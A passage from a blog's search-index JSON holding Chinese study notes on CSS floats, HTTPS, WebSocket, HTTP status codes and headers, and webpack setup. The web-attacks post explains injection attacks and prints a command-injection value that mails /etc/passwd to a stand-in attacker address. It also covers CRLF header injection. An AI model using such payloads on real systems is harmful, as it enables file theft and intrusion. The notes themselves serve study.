/*照顾兼容性*/ line-height:0; font-size:0; &#125; margin负值巧妙使用 12345678910111213141516171819202122232425262728&lt;style&gt; ul li &#123; list-style-type: none; float:left; width: 150px; height: 200px; border:1px solid red; margin-left: -1px; &#125; ul li:hover &#123; /* 如果盒子没有定位则添加相对定位使得合资压住所有其他标准流 */ position:relative; border: 1px solid blue; &#125; ul li :hover &#123; /* 如果盒子有定位设置z-index提高盒子层级 */ z-index:1; border: 1px solid blue; &#125; &lt;/style&gt; &lt;ul&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;/ul&gt;","categories":[{"name":"CSS","slug":"CSS","permalink":"https://coloey.github.io/categories/CSS/"}],"tags":[]},{"title":"清除浮动","slug":"清除浮动","date":"2022-04-13T01:36:28.000Z","updated":"2022-04-13T03:36:27.389Z","comments":true,"path":"2022/04/13/清除浮动/","link":"","permalink":"https://coloey.github.io/2022/04/13/%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8/","excerpt":"","text":"为什么需要清除浮动由于父级盒子很多情况下，不方便给高度，当时盒子浮动又不占有位置，最后父级盒子高度为 0 时，就会影响下面的盒子，对后面元素排版产生影响。 清除浮动本质 清除浮动的本质是清除浮动元素造成的影响 如果父盒子本身具有高度，则不需要清除浮动 清除浮动之后，父级会根据浮动的子盒子自动检测高度，父级有了高度，就不会影响下面的标准流了 语法： 123选择器: &#123; clear: 属性值;&#125; 属性值 描述 left 不允许左侧有浮动元素 right 不允许右侧有浮动元素 both 同时清除左右两侧浮动 清除浮动策略：闭合浮动 方法： 额外标签法（隔墙法），是 W3C 推荐的方法 父级添加 overflow 属性 父级添加 after 伪元素 父级添加双伪元素 额外标签法也称为隔墙法，是 W3C 推荐的方法。 额外标签法是在最后一个浮动元素末尾添加一个 空块级元素（不能是行内元素），给其赋以属性 clear:both;。 1234&lt;style&gt; clear: both;&lt;/style&gt;&lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;Copy to clipboardErrorCopied 优点：通俗易懂，书写方便 缺点：添加许多无意义的标签，结构化差 总结 清除浮动的本质 清除浮动的本质是清除浮动元素脱离标准流造成的影响 清除浮动的策略 闭合浮动，只让浮动在父盒子内部影响，不影响父盒子外面的其他盒子。 使用场景 实际开发中可能会遇到，但是不常用。 父级添加 overflow 属性可以给父级添加 overflow 属性，将其属性设置为 hidden、auto或scroll。 注意是给父元素添加代码： 优点：代码简洁 缺点：无法显示溢出部分 父级添加 after 伪元素实际上也是额外标签法的一种。（相当于在最后一个子元素后面再添加一个元素隔开） 123456789101112.clearfix &#123; content: &quot;&quot;; display: block;//伪元素为行内块元素，要转换为块级元素 height: 0; clear: both; visibility: hidden;&#125;.clearfix &#123; /*IE6、7专有*/ *zoom: 1;&#125; 父级添加双伪元素1234567891011.clearfix::before,.clearfix::after &#123; content: &quot;&quot;;//前后都隔开 display: table;//伪元素为行内块元素，要转换为块级元素&#125;.clearfix::after &#123; clear: both;&#125;.clearfix &#123; *zoom: 1;&#125;Copy to clipboardErrorCopied 优点：代码更简洁 缺点：照顾低版本浏览器 代表网站：小米、腾讯 伪元素转化为块级元素原因：根本原因是为了解决clearfix内部非浮动元素margin塌陷问题。 另发现一个新属性display: flow-root，不支持Safari。它可以创建无副作用的BFC。在父级块中使用 display: flow-root 可以创建新的BFC。其作用和clearfix一致。 参考： 为什么需要清除浮动？ 父级没高度 子盒子浮动了 影响下面布局了，应该清除浮动。","categories":[{"name":"CSS","slug":"CSS","permalink":"https://coloey.github.io/categories/CSS/"}],"tags":[]},{"title":"HTTPS","slug":"HTTPS","date":"2022-04-12T14:02:46.000Z","updated":"2022-04-13T02:10:02.870Z","comments":true,"path":"2022/04/12/HTTPS/","link":"","permalink":"https://coloey.github.io/2022/04/12/HTTPS/","excerpt":"","text":"HTTP+加密+认证+完整性保护=HTTPSHTTPS是HTTP通信接口部分用SSL和TLS协议代替。 SSL是独立于HTTP的协议 相互交换密钥的公开密钥加密技术共享密钥加密加密和解密用一个密钥的方式，也叫做对称密钥加密 使用两把密钥的公开密钥加密使用非对称的密钥，一把叫做私有密钥，另一把叫做公有密钥，私有密钥不能让任何人知道，公有密钥可以随意发布。 发送密文的一方使用对方的公开密钥进行加密处理，对方收到被加密的信息后，再使用自己的私有密钥进行解密，解密过程是队离散对数的求值。 HTTPS采用混合加密机制 证明公开密钥正确性的证书 HTTPS的安全通信机制 客户端通过发送Client Hello报文开始SSL通信，报文中包含客户端支持的SSL的指定版本，加密组件列表 服务器可进行SSL通信时，会以Server Hello报文作为应答，和客户端一样，在报文中包含SSL版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的 之后服务器发送Certificate报文，报文中包含公开密钥证书 最后服务器发送Server Hello Done 报告通知客户端，最初阶段的SSL握手协商部分结束 SSL第一次握手结束后，客户端以Client Key Exchange报文作为回应，报文中包含通信加密中使用的一种被称为Pre-master secret的随机密码串，该报文已用步骤3中的公开密钥进行加密 接着客户端继续发送Change Cipher Spec报文，该报文会提示服务器，在此报文之后的通信会采用Pre-master secret密钥加密 客户端发送Finished报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否正确解密该报文作为判定标准 服务器同样发送Change Cipher Spec报文 服务器同样发送Finished报文 服务端和客户端的Finished报文交换完毕后，SSL连接就建立完成。通信会受到SSL保护，从此开始进行应用层协议通信，即发送HTTP请求 SSL缺点： 通信慢 大量消耗CPU及内存资源，导致处理速度慢","categories":[{"name":"http","slug":"http","permalink":"https://coloey.github.io/categories/http/"}],"tags":[]},{"title":"针对Web的攻击技术","slug":"针对Web的攻击技术","date":"2022-04-12T10:09:24.000Z","updated":"2022-04-12T14:00:45.873Z","comments":true,"path":"2022/04/12/针对Web的攻击技术/","link":"","permalink":"https://coloey.github.io/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/","excerpt":"","text":"针对Web应用的攻击模式 主动攻击 被动攻击 以服务器为目标的主动攻击指攻击者通过直接访问Web应用，把攻击代码传入的攻击模式，由于该模式是直接针对服务器的资源进行攻击的，因此攻击者需要能访问到那些资源，主动攻击模式里具有代表性的攻击时SQL注入攻击和OS命令注入攻击 以服务器为目标的被动攻击被动攻击利用圈套策略执行攻击代码的攻击模式。攻击者不直接对目标Web应用访问攻击 跨站脚本攻击（XSS）是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击，动态创建的HTML部分可能隐藏着安全漏洞，就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，就会受到被动攻击 跨站脚本攻击可能造成的影响 利用虚假输入的表单骗取用户个人信息 利用脚本窃取用户的COOkie值，被害者在不知情的情况下帮助攻击者发送请求 显示伪造的文章或图片 eg: 在网站地址朗中URI测查询字段ID即相当于在表单内自动填写字符串的功能，写入： 对用户Cookie的窃取 SQL注入攻击会执行非法SQL的SQL注入攻击 造成影响： 非法查看或篡改数据库内的数据 规避认证 执行和数据库服务业务关联的程序等 eg: 某购物网站可将坐着名字作为搜索关键字查找他的所有著作 结果跟flag=1的设定值无关，只取出author=”上野宣”，这样未出版的书籍也一并显示 OS命令注入攻击指通过Web应用，执行非法的操作系统命令达到攻击的目的，只要在能调用Shell函数的地方就有存在被攻击的风险。 可以从Web应用中通过Shell来调用操作系统命令，倘若调用Shell时存在疏漏，就可以执行非法的OS命令。OS命令注入攻击可以向Shell发送命令，让Windows或Linux操作系统的命令行启动程序。 eg: 咨询表单的发送功能，将用户的咨询邮件按已填写对方的邮箱地址发送过去。 123my $adr= $q-&gt;param(&#x27;mailaddress&#x27;);open(MAIL,&quot;| /usr/sbin/sendmail $adr&quot;);print MAIL &quot;FROM :info@example.com\\n&quot;; 程序中的open函数会调用sendmail命令发送邮件，而制定邮件发送地址是$adr，攻击者把下面的值制定为邮件地址 1;cat /etc/passwd |mail hack@example.jp 程序接收到该值后构成以下组合： 1open(MAIL,&quot;| /usr/sbin/sendmail;cat /etc/passwd | mail hack@example.jp “;”在OS命令中会被解析为分割多个执行命令的标记，因此sendmail会将含有Linux账户信息/etc/passwd的文件以邮件形式发送给&#104;&#x61;&#99;&#x6b;&#64;&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#106;&#x70;。 HTTP首部注入攻击值攻击者通过在响应首部字段内插入换行，添加任意响应首部或主题的一种攻击，属于被动攻击模式。向首部主题内添加内容的攻击称为HTTP响应阶段攻击。 HTTP首部注入攻击有可能会造成以下影响： 设置任何Cookie信息 重定向至任意URL 显示任意的主体（HTTP响应阶段攻击） 此刻，Set-Cookie生效，攻击者可指定修改任意Cookie信息，通过和绘画固定攻击组合，攻击者可伪装成用户 攻击者输入%0D%0A变成换行符，结果插入了新的首部字段。 HTTP响应截断攻击HTTP响应截断攻击是用在HTTP首部注入的一种攻击，攻击顺序相同，但是要将两个%0D%0A%0D%0A并排插入字符串后发送，利用这两个连续的换行可作出HTTP首部和主体分割所需的空行，这样就能显示伪造的主体，达到攻击目的。 利这种攻击，已触发陷阱的用户浏览器会显示伪造的WEB页面，再让用户输入自己的个人信息，达到和XSS攻击相同效果 邮件首部注入攻击攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击。利用存在安全漏洞的Web网站，可对任意邮件地址发送广告邮件或病毒邮件。邮件地址：%0D%0A 代表一个换行符，可以实现邮件地址的追加 %0D%0A%0D%0A代表两个连续的换行符，可以篡改邮件文本内容 目录遍历攻击：对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击用户可使用．…/等相对路径定位到/etc/passed等绝对路径上例： 远程文件包含漏洞当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。例： 开放重定向是指对指定的任意URL左重定向跳转功能，而与此功能先关联的安全漏洞是指，加入指定的重定向URL到某个具有恶意的Web网站，那么用户就会被诱导到那个网站，有可能被攻击者选中并作为钓鱼攻击的跳板 因会话管理疏忽引发漏洞会话劫持：攻击者通过某种手段拿到用户的会话ID，并非法使用此会话ID伪装成用户，达到攻击目的。 会话 会话固定攻击对以窃取目标会话ID为主动攻击手段的会话劫持，会话固定攻击会强制用户使用攻击者指定额会话ID 例子： 跨站点请求伪造（CSRF）是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。 可能造成的影响： 利用已通过认证的用户权限更新设定信息等 利用已通过认证的用户权限购买商品 利用已通过认证的用户权限在留言板发表言论 例子： DOS攻击是一种让运行中的服务呈停止状态的攻击，有时也叫停止攻击或拒绝服务攻击，DoS攻击的对象不仅限于Web网站，还包括网络设备及服务器。 主要有两种DOS攻击方式： 集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈现停止状态。 通过攻击安全漏洞使服务停止 集中利用访问请求，就是发送大量的合法请求，服务器很难分辨何为正常请求，何为攻击请求，因此很难防止DOS攻击。 多台计算机发起的DOS攻击称为DDOS攻击，DDOS攻击通常利用那些感染病毒的极端及作为攻击者的攻击跳板","categories":[{"name":"http","slug":"http","permalink":"https://coloey.github.io/categories/http/"}],"tags":[]},{"title":"WebSocket","slug":"WebSocket","date":"2022-04-12T09:46:11.000Z","updated":"2022-04-12T10:03:19.606Z","comments":true,"path":"2022/04/12/WebSocket/","link":"","permalink":"https://coloey.github.io/2022/04/12/WebSocket/","excerpt":"","text":"初次接触 WebSocket 的人，都会问同样的问题：我们已经有了 HTTP 协议，为什么还需要另一个协议？它能带来什么好处？ 答案很简单，因为 HTTP 协议有一个缺陷：通信只能由客户端发起。 举例来说，我们想了解今天的天气，只能是客户端向服务器发出请求，服务器返回查询结果。HTTP 协议做不到服务器主动向客户端推送信息。 这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。我们只能使用“轮询”：每隔一段时候，就发出一个询问，了解服务器有没有新的信息。最典型的场景就是聊天室。 轮询的效率低，非常浪费资源（因为必须不停连接，或者 HTTP 连接始终打开）。因此，工程师们一直在思考，有没有更好的方法。WebSocket 就是这样发明的。 使用浏览器进行全双工通信的WebSocketWebSocket 协议在2008年诞生，2011年成为国际标准。所有浏览器都已经支持了。 它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于服务器推送技术的一种。 其他特点包括： （1）建立在 TCP 协议之上，服务器端的实现比较容易。 （2）与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。 （3）减少通信量，只要建立起WebSocket连接，就希望一直保持连接，和http相比，不但每次连接时走开小减少。而且数据格式比较轻量，性能开销小，通信高效。 （4）可以发送文本，也可以发送二进制数据。 （5）没有同源限制，客户端可以与任意服务器通信。 （6）协议标识符是ws（如果加密，则为wss），服务器网址就是 URL。 1ws://example.com:80/some/path 握手请求1Upgrade:websocket Set-WebSocket-Key字段内记录着握手过程中必不可少的键值，Sec-WebSocket-Protocol字段内记录使用的子协议，子协议按WebSocket协议标准在连接分开使用时，定义那些连接的名称 握手响应对于之前的请求，返回状态码101 Switching Protocols的响应","categories":[{"name":"WebSocket","slug":"WebSocket","permalink":"https://coloey.github.io/categories/WebSocket/"}],"tags":[]},{"title":"返回结果的http状态码","slug":"返回结果的http状态码","date":"2022-04-11T11:58:12.000Z","updated":"2022-04-11T13:30:34.582Z","comments":true,"path":"2022/04/11/返回结果的http状态码/","link":"","permalink":"https://coloey.github.io/2022/04/11/%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E7%9A%84http%E7%8A%B6%E6%80%81%E7%A0%81/","excerpt":"","text":"状态码作用：状态码的职责是当客户端向服务器发送请求时，描述返回的请求结果，借助状态码，用户可以知道服务器时正常处理了请求，还是出现了错误。 状态码类别： 类别 原因短语 1xx Informational(信息状态码) 接收的请求正在处理 2xx Success(成功状态码) 请求正常处理完毕 3xx Redirection(重定向状态码) 需要进行附加操作以完成请求 4xx Client Error(客户端错误状态码) 服务器无法处理请求 5xx Server Error(服务器错误状态码) 服务器处理请求出错 2xx成功200 OK表示从客户端发来的请求在服务器端被正常处理了 在响应报文内，随状态码一起返回的信息会因方法的不同而发生改变。比如，使用Get方法，对应请求支援的实体会作为响应返回；而使用HEAD方法时，对应请求资源的实体首部不随报文实体作为响应返回。（即在响应中只返回首部，不返回实体主体部分） 204 No Content该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。另外，不允许返回任何实体的主体。比如，当从浏览器中发出请求处理后，返回204响应，那么浏览器显示的页面不发生更新。 一般在只需要从客户端往服务器发送消息，而对客户端不需要发送新消息内容的情况下使用 206 Partial Content该状态码表示客户端进行范围请求，而服务器成功执行了这部分的GET请求。响应报文中包含由Content-Range指定范围的实体内容 3xx重定向3xx响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。 301 Moved Permanently永久性重定向。该状态码表示请求的资源已被分配了新的URI，以后应该使用资源现在所指的URI，也就是说，如果已经把资源对应的URI保存为书签，这时应该按Location首部字段提示的URI重新保存。 eg: http://example.com/sample 当指定资源路径的最后忘记添加“/“，就会产生301状态码 302 Found临时性重定向，该状态码表示请求的资源已被分配了新的URI，希望用户（本次）能使用新的URI访问。和301 Moved Permanently状态码相似，但302状态码代表的资源不是被永久移动，只是临时性质。换句话说，已移动的资源对应的URI将来还有可能发生改变。用户把URI保存成书签，但不会像301状态码出现时那样去更新书签，而是仍旧保留返回的302状态码的页面对应的URI。 303 See Other该状态码表示由于请求对应的资源存在着另一个URI，应使用GET方法定向获取请求的资源。303状态码和302Found状态码有着相同功能。但303状态码明确表示客户端应当采用GET方法获取资源，这点与302状态码有区别。比如，当使用POST方法访问CGI程序，其执行后的处理结果是希望客户端能以GET方法重定向到另一个URI上去时，返回303状态码。 当301,302,303返回响应码时，几乎所有浏览器都会把POST改为GET，并删除请求报文的主体，之后请求会自动再次发送。 301,302标准是禁止将POST改为GET，但实际上大家都这么做。 304 Not Modified该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况，304状态码返回时，不包括任何响应的主体部分。304和重定向没有关系。 307 Temporary Redirect临时重定向。该状态码与302 Found有着相同的含义。尽管302标准禁止POST变为GET，但实际使用时大家并不遵守。307会按照浏览器标准，不会从POST变成GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同情况。 4xx客户端错误4xx的响应结果表明客户端时发生错误的原因所在 400 Bad Request该状态码表示请求报文中存在语法错误，当错误发生时，需修改请求的内容后再次发送请求。另外，浏览器会像200 Ok一样对待状态码 401 Unauthorized该状态码表示发送的请求需要有通过HTTP认证（BASIC认证、DIGEST认证）的认证信息。另外若之前已进行过1次请求，则表示用户认证失败。 返回含有401的响应必须包含一个适用于被请求资源的WWW-Authenticate首部用于质询用户信息，当浏览器初次接收到401响应，会弹出认证用的对话窗口。 403 Forbidden该状态码表明对请求资源的访问被服务器拒绝了。服务端没有给出拒绝的详细理由，但如果做说明，可以在实体的主体部分对原因进行描述。 未获得文件系统的访问授权，访问权限出现某些问题（从未授权的源IP地址试图访问）等列举的情况都可能是发生403的原因。 404 Not Found该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务端拒绝请求且不想说理由时使用。 5xx服务器错误5xx的响应结果表明服务器本身发生错误 500 Internal Server Error表明服务器端在执行请求时发生了错误，也有可能时Web应用存在的bug或某些临时的故障 503 Service Unavailable表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。如果事先得知解除以上状况需要的时间，最好写入Retry-After首部字段再返回给客户端。 状态码和状况不一致： 不少返回的状态码响应都是错误的，但是用户可能察觉不到这点，比如Web应用程序内部发生错误，状态码依然返回200 OK。","categories":[{"name":"http","slug":"http","permalink":"https://coloey.github.io/categories/http/"}],"tags":[]},{"title":"http请求首部字段","slug":"http请求首部字段","date":"2022-04-11T11:53:59.000Z","updated":"2022-04-12T14:34:10.450Z","comments":true,"path":"2022/04/11/http请求首部字段/","link":"","permalink":"https://coloey.github.io/2022/04/11/http%E8%AF%B7%E6%B1%82%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5/","excerpt":"","text":"Accept Accept:text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept首部字段通知服务器，用户代理能够处理的媒体类型及媒体类型的相对优先级。可用type/subtype这种形式，一次指定多种媒体类型。 文本文件：text/html,text/plain,text/css… application/xhtml+xml,application/xml… 图片文件：image/jpg,image/gif… 视频文件：video/mpeg,video/quicktime… 应用程序使用的二进制文件：application/octet-stream,application/zip… 若想给显示的媒体类型增加优先级，使用q=来额外表示权重值，用分号（；）进行分隔，权重值q范围是0~1,（可精确到小数点后3位，且1为最大值。不指定权重值q时，默认权重为q=1.0 当服务器提供多种内容时，将首先返回权重值最高的媒体类型。 Accept-Charset Accept-Charset:iso-8859-5,unicode-1-1;q=0.8 Accept-Charset首部字段可用来通知服务器用户代理支持的字符集及字符集的相对优先顺序。另外，可一次性指定多种字符集。与各首部字段Accept相同的是可用权重q值来表示相对优先级 该首部字段用于内容协商机制的服务器驱动协商。 Accept-Encoding Accept-Encoding:gzip,deflate Accept-Encoding 首部字段用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序。可一次性指定多种内容编码。 gzip:由文件压缩程序gzip（GNU zip)生成的编码格式，采用LZ77及32为循环冗余校验 compress:由UNIX文件压缩程序compress生成的编码格式，采用的算法LZW deflate:组合使用zlib格式及由deflate压缩算法生成的编码格式 identity:不执行压缩或不会变化的默认编码格式 采用权值q来表示相对优先级，这点与首部字段Accept相同。可用(*)作为通配符，指定任意编码格式 Accept-Language告知服务器用户代理能够处理的自然语言集，以及自然语言集的相对优先级。可一次指定多种自然语言集 按权重q表示相对优先级。 Authorization首部字段Authorization用来告知服务器，用户代理的认证信息，通常想要通过服务器认证的用户代理会在接收待返回的401状态码后，把首部字段Authorization加入到请求中。共用缓存在接收到含有Authorization首部字段的请求时的操作处理会略有差异。 Expect Expect:100-continue 客户端使用首部字段Expect来告知服务器，期望出现的某种特定行为，因服务器无法理解客户端的期望做出回应而发生错误时，会返回417Expectation Failed 客户端可以利用该首部字段，写明所期望的扩展。虽然HTTP/1.1规范只定义100-continue(状态码100Continue之意) From首部字段From用来告知服务器使用用户代理的用户的电子邮件地址。通常使用目的是为了显示搜索引擎用户代理的负责人的电子邮件联系方式。使用代理时，尽可能包含From首部字段 Host首部字段Host会告知服务器，请求的资源所处的互联网主机名和端口号。Host首部字段再HTTP/1.1规范内是唯一一个必须被包含在请求内的首部字段。 请求被发送到服务器时，请求中的主机名会用IP地址直接替换解决，但如果这时相同的IP地址下部署运行着多个域名，那么服务器就无法理解是哪个域名对应的请求。因此，就要使用首部字段Host来明确指出请求的主机名，若服务器未设定主机名，那直接发送空值。 Host: If-Matchif-xxx为条件请求，服务器接收到附带条件请求后，只有判断指定条件为真，才执行请求。 首部字段If-Match，属于附带条件之一，它会告知服务器匹配资源所用的实体标记(ETag)值，这时的服务器无法使用弱ETag值，服务器对比If-Match的字段值与资源的ETag值，仅当两者一致时才执行请求，否则，返回状态码412 Precondition Failed 还可以使用(*)指定If-Match的字段值，针对这种情况，服务器会忽略ETag的值，只要资源存在就处理请求。 If-Modified-Since If-Modified-Since: Thu,15 Apr 2004 00:00:00 GMT 首部字段If-Modified-Since属于附带条件之一，它会告知服务器若If-Modified-Since字段值早于资源的更新时间，则希望能处理该请求，而在If-Modified-Since字段值的日期时间后，如果请求的资源都没有更新，返回状态码304Not Modified的响应 If-Modified-Since用于确认代理或客户端拥有的本地资源的有效性，获取资源的更新时间可通过确认首部字段Last-Modified确定 If-None-Match与If-Match作用相反，用于指定If-None-Match字段值的实体标记（ETag)值与请求资源得到ETag不一致时会告知服务器处理该请求。 在GET或HEAD方法中使用首部字段If-None-Match可获取最新的源，因此这与使用首部字段If-Modified-Since有些类似。 If-RangeIf-Range字段值若是和ETag值或更新的日期时间匹配一致，那么就作为范围请求处理，若不一致返回全部资源 如果不使用If-Range,而是使用If-Match,服务器端的资源如果更新了，那客户端持有的资源中的一部分也会随之无效，服务器端就会以402 Precondition Failed返回，催促客户端再次发请求，与使用If-Range相比，就要花费两倍的功夫。 If-Unmodified-Since与If-Modified-Since作用相反，它的作用是告知服务器，指定的资源只有在字段值内指定的日期时间之后未发生更新得情况下，才能处理请求，如果在指定日期时间后发生了更新，则以状态码412 Precondition Failed作为响应返回 Max-Forwards通过TRACE方法或OPTIONS方法，发送包含首部字段Max-Forwards的请求时，该字段以十进制整数的形式指定可经过的服务器最大数目。服务器在往下一个服务器转发请求前，Max-Forwards的值减1后重新复制，当服务器收到Max-Forwards值为0的请求时则不再进行转发，而是直接返回响应。 如果代理服务器由于某些原因导致请求转发失败，客户端也就等不到服务器返回的响应。","categories":[{"name":"http","slug":"http","permalink":"https://coloey.github.io/categories/http/"}],"tags":[]},{"title":"开发环境","slug":"开发环境","date":"2022-04-11T06:51:43.000Z","updated":"2022-04-11T11:53:09.615Z","comments":true,"path":"2022/04/11/开发环境/","link":"","permalink":"https://coloey.github.io/2022/04/11/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/","excerpt":"","text":"开发环境中使用source map当 webpack 打包源代码时，可能会很难追踪到 error(错误) 和 warning(警告) 在源代码中的原始位置。例如，如果将三个源文件（a.js, b.js 和 c.js）打包到一个 bundle（bundle.js）中，而其中一个源文件包含一个错误，那么堆栈跟踪就会直接指向到 bundle.js。你可能需要准确地知道错误来自于哪个源文件，所以这种提示这通常不会提供太多帮助。 为了更容易地追踪 error 和 warning，JavaScript 提供了 source maps 功能，可以将编译后的代码映射回原始源代码。如果一个错误来自于 b.js，source map 就会明确的告诉你。 source map 有许多 可用选项，请务必仔细阅读它们，以便可以根据需要进行配置。 对于本指南，我们将使用 inline-source-map 选项，这有助于解释说明示例意图（此配置仅用于示例，不要用于生产环境）： 1234567891011121314151617181920212223242526272829303132333435363738394041const path=require(&#x27;path&#x27;)const HtmlWebpackPlugin=require(&quot;html-webpack-plugin&quot;)module.exports=&#123; entry:&#123; index: &#x27;./src/index.js&#x27;, print:&#x27;./src/print.js&#x27; &#125;, output:&#123; filename:&#x27;[name]bundle.js&#x27;, path:path.resolve(__dirname,&#x27;dist&#x27;), clean:true, publicPath:&#x27;/&#x27;, &#125;, module:&#123; rules:[ &#123; test: /\\.css$/i, use:[&#x27;style-loader&#x27;,&#x27;css-loader&#x27;], &#125;, &#123; test:/\\.(png|jpg|jpeg|svg|gif)$/i, type:&#x27;asset/resource&#x27; &#125;, ] &#125;, devtool:&#x27;inline-source-map&#x27;, devServer:&#123; static:&#x27;./dist&#x27;, &#125;, plugins:[ new HtmlWebpackPlugin(&#123; title:&#x27;Development&#x27;, &#125;) ], mode:&#x27;development&#x27;&#125; 选择开发工具webpack 提供几种可选方式，帮助你在代码发生变化后自动编译代码： webpack’s Watch Mode webpack-dev-server webpack-dev-middleware 多数场景中，你可能需要使用 webpack-dev-server，但是不妨探讨一下以上的所有选项。 使用watch mode你可以指示 webpack “watch” 依赖图中所有文件的更改。如果其中一个文件被更新，代码将被重新编译，所以你不必再去手动运行整个构建。 我们添加一个用于启动 webpack watch mode 的 npm scripts： package.json 12345678910111213141516171819202122&#123; &quot;name&quot;: &quot;webpack-demo&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;private&quot;: true, &quot;scripts&quot;: &#123; &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;,+ &quot;watch&quot;: &quot;webpack --watch&quot;, &quot;build&quot;: &quot;webpack&quot; &#125;, &quot;keywords&quot;: [], &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;devDependencies&quot;: &#123; &quot;html-webpack-plugin&quot;: &quot;^4.5.0&quot;, &quot;webpack&quot;: &quot;^5.4.0&quot;, &quot;webpack-cli&quot;: &quot;^4.2.0&quot; &#125;, &quot;dependencies&quot;: &#123; &quot;lodash&quot;: &quot;^4.17.20&quot; &#125; &#125; 现在，你可以在命令行中运行 npm run watch，然后就会看到 webpack 是如何编译代码。 唯一的缺点是，为了看到修改后的实际效果，你需要刷新浏览器。如果能够自动刷新浏览器就更好了，因此接下来我们会尝试通过 webpack-dev-server 实现此功能。 webpack-dev-serverwebpack-dev-server 为你提供了一个基本的 web server，并且具有 live reloading(实时重新加载) 功能。设置如下： 1npm install --save-dev webpack-dev-server 修改配置文件，告知 dev server，从什么位置查找文件： webpack.config.js 123456789101112131415161718192021222324 const path = require(&#x27;path&#x27;); const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;); module.exports = &#123; mode: &#x27;development&#x27;, entry: &#123; index: &#x27;./src/index.js&#x27;, print: &#x27;./src/print.js&#x27;, &#125;, devtool: &#x27;inline-source-map&#x27;,+ devServer: &#123;+ static: &#x27;./dist&#x27;,+ &#125;, plugins: [ new HtmlWebpackPlugin(&#123; title: &#x27;Development&#x27;, &#125;), ], output: &#123; filename: &#x27;[name].bundle.js&#x27;, path: path.resolve(__dirname, &#x27;dist&#x27;), clean: true, &#125;, &#125;; 以上配置告知 webpack-dev-server，将 dist 目录下的文件 serve 到 localhost:8080 下。（译注：serve，将资源作为 server 的可访问文件） 我们添加一个可以直接运行 dev server 的 script： package.json 123456&quot;scripts&quot;: &#123; &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;, &quot;watch&quot;: &quot;webpack --watch&quot;,+ &quot;start&quot;: &quot;webpack serve --open&quot;, &quot;build&quot;: &quot;webpack&quot; &#125;, 现在，在命令行中运行 npm start，我们会看到浏览器自动加载页面。如果你更改任何源文件并保存它们，web server 将在编译代码后自动重新加载 webpack-dev-middlewarewebpack-dev-middleware 是一个封装器(wrapper)，它可以把 webpack 处理过的文件发送到一个 server。webpack-dev-server 在内部使用了它，然而它也可以作为一个单独的 package 来使用，以便根据需求进行更多自定义设置。下面是一个 webpack-dev-middleware 配合 express server 的示例。 首先，安装 express 和 webpack-dev-middleware： 1npm install --save-dev express webpack-dev-middleware 调整webpack.config,js 12345678910111213141516171819202122232425 const path = require(&#x27;path&#x27;); const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;); module.exports = &#123; mode: &#x27;development&#x27;, entry: &#123; index: &#x27;./src/index.js&#x27;, print: &#x27;./src/print.js&#x27;, &#125;, devtool: &#x27;inline-source-map&#x27;, devServer: &#123; static: &#x27;./dist&#x27;, &#125;, plugins: [ new HtmlWebpackPlugin(&#123; title: &#x27;Development&#x27;, &#125;), ], output: &#123; filename: &#x27;[name].bundle.js&#x27;, path: path.resolve(__dirname, &#x27;dist&#x27;), clean: true,+ publicPath: &#x27;/&#x27;, &#125;, &#125;; 我们将会在 server 脚本使用 publicPath，以确保文件资源能够正确地 serve 在 http://localhost:3000 下，稍后我们会指定 port number(端口号)。接下来是设置自定义 express server： 12345678910 webpack-demo |- package.json |- package-lock.json |- webpack.config.js+ |- server.js |- /dist |- /src |- index.js |- print.js |- /node_modules server.js 1234567891011121314151617181920const express = require(&#x27;express&#x27;);const webpack = require(&#x27;webpack&#x27;);const webpackDevMiddleware = require(&#x27;webpack-dev-middleware&#x27;);const app = express();const config = require(&#x27;./webpack.config.js&#x27;);const compiler = webpack(config);// 告知 express 使用 webpack-dev-middleware，// 以及将 webpack.config.js 配置文件作为基础配置。app.use( webpackDevMiddleware(compiler, &#123; publicPath: config.output.publicPath, &#125;));// 将文件 serve 到 port 3000。app.listen(3000, function () &#123; console.log(&#x27;Example app listening on port 